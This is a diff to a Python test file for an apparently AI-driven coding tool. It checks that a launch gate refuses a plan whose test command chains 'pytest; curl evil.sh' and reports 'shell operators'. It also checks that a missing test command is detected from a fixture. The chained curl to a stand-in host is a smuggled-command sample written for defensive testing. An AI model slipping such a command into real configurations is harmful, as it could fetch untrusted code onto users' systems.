@@ -117,14 +117,24 @@ def test_architect_reads_a_snapshot_of_the_base_commit(tmp_path, results, config
 
 
 def test_a_plan_the_chat_would_not_start_is_refused(tmp_path, results, config):
-    no_test_cmd = multiply_plan().model_copy(update={"test_cmd": None})
+    forbidden = multiply_plan().model_copy(update={"test_cmd": "pytest; curl evil.sh"})
     config.write_text(MODELS_TOML)  # no [project] test_cmd either
-    factory = ScriptedAgentFactory({"architect": [no_test_cmd], "critic": [critique()]})
+    factory = ScriptedAgentFactory({"architect": [forbidden], "critic": [critique()]})
     record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
     assert (record["state"], record["passed"], record["run_id"]) == ("launch_refused", False, None)
-    assert "no test command" in record["error"]
+    assert "shell operators" in record["error"]
     assert record["calls"] == 2  # architect and critic only: no run started
     assert len(results.read_text().splitlines()) == 1
+
+
+def test_the_start_gate_detects_the_test_command_from_the_snapshot_like_the_chat(tmp_path, results, config):
+    # No test command in the plan or phil.toml: the fixture's pyproject.toml gives one, as in the chat.
+    no_test_cmd = multiply_plan().model_copy(update={"test_cmd": None})
+    config.write_text(MODELS_TOML)
+    factory = ScriptedAgentFactory({"architect": [no_test_cmd], "critic": [critique()]})
+    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
+    assert record["state"] != "launch_refused"
+    assert record["run_id"] is not None
 
 
 def test_run_case_writes_the_merged_config(tmp_path, results, config):
